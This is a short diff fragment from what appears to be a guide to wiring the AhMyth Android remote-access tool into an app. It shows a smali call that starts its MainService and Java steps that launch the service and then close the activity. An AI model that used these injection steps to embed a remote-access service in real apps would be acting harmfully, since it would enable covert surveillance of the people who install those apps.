@@ -6,6 +6,7 @@ invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->start()V
 - MainActivity.java
 ```java
 MainService.startService(this);
+finish();
 ```
 - MyReciever.java
 ```java
